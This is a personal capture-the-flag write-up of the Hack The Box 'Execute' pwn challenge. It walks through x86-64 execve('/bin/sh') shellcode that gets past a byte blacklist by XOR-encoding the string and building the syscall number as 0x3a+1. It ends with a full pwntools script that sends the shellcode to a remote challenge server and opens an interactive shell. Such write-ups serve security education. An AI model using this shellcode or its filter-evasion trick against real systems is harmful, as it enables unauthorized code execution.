# EXECUTE

Thanks to jon-brandy this challenge was solved because of him, I followed his [writeup](https://github.com/jon-brandy/hackthebox/blob/main/Categories/Pwn/Execute/README.md) and took notes for myself here.

- Information about the binary present for this challenge
```sh
execute: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=815ed65e93f716cd381035b74fa25dc5d7aa8ff5, for GNU/Linux 3.2.0, not stripped
```

- Security features in the binary
```sh
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX disabled
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- From above we can see that execution on stack is possible, so it's all about figuring shell code which we can execute on the stack.
- Let's review source code
```c
int main(){
    char buf[62];
    char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

    setup();

    puts("Hey, just because I am hungry doesn't mean I'll execute everything");
    
    int size = read(0, buf, 60);
	   
    if(!check(blacklist, buf, size, strlen(blacklist))) {
        puts("Hehe, told you... won't accept everything");
        exit(1337);
    }

    ( ( void (*) () ) buf) ();
}
```
- From the source code we can see that there is a blacklist defined.
- Our end objective is to get and interactive shell from the server, for that we have to first see the hex value for "/bin/sh

```python
str = "/bin/sh"
s_bytes = s.encode('utf-8')
s_hex = s_bytes.hex()
s_hex
'2f62696e2f7368'
```

- From this we can see there are values that match to the blacklist, now we have to see if there is a way we can hide them, first we'll pass minimal level shellcode for checking if the detection is happening and where

```asm
mov rax, 0x68732f6e69622f   ; hex encoded value of /bin/sh
push rax                    ; push the value in rax on stack
mov rdi, rsp                ; moves the value in rsp to rdi, rsp points to the top of stack which currently has /bin/sh
xor rsi, rsi                ; zero out rsi (array of arguments in context of execve)
xor rdx, rdx                ; zero out rdx (env variable on context of execve)
mov rax, 0x3b               ; 0x3b is syscall for execve
syscall
```

- This the reponse of the first run and we were right the /bin/sh is being blacklisted.
```sh
BAD Byte --> 0x62
ASCII Value --> b
BAD Byte --> 0x69
ASCII Value --> i
BAD Byte --> 0x6e
ASCII Value --> n
BAD Byte --> 0x73
ASCII Value --> s
BAD Byte --> 0x68
ASCII Value --> h
BAD Byte --> 0xf6
ASCII Value --> ö
BAD Byte --> 0xd2
ASCII Value --> Ò
BAD Byte --> 0xc0
ASCII Value --> À
BAD Byte --> 0x3b
ASCII Value --> ;
```
- Apart from /bin/sh we can see that execve call (0x3b) is also being blacklisted, for making this work we can use 0x3a and add 1 byte to it
```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

push 0x0    ; set of push and pops leads to setting of rsi 
pop rsi     ; and rdi to 0x0
push 0x0    ; helps in removing the NUll bytes
pop rdx

push 0x3a   ; helps in bypassing the black listing of execve and helps in removing the last null character
add al, 0x1
syscall
```
- The weird part is xoring twice and the upper method are doing exactly the same thing but this one helps in removing the NULL values.

- Next step is to find a way to obfuscate the /bin/sh string. Xoring is always a cool way due to it's self-cancelling property, we can come back to our original string and avoid the check that happens with the buffer.
- Now finding the key which we can use, so the idea is that key will be a hex value which when xored with the "/bin/sh" value should not return any hex value that is present in the black list. The plan is to start from 0xfffffffffffffff and go down, but this is a brute force, fortunately for us this key itself is okay for our purpose.
we can do a bit of xoring ourself and see that the terms doesn't appear.

- Wrote a script for the same

- Final shellcode is
```asm
mov rax, 0xfffffffffffffff
push rax

mov rax, 0xfffffffffffffff ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
```
- Now we can use the following python script for getting shell on the server.
```python
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

# sh = process(exe)
sh = remote('94.237.49.212', 30995)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

payload = '''    
mov rax, 0xfffffffffffffff
push rax

mov rax, 0xfffffffffffffff ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
'''

shell_code = asm(payload)
for byte in shell_code:
    if byte in blacklist:
        print(f'BAD Byte --> 0x{byte:02x}')
        print(f'ASCII Value --> {chr(byte)}')

sh.sendline(shell_code)
sh.interactive()
```
*Completed*
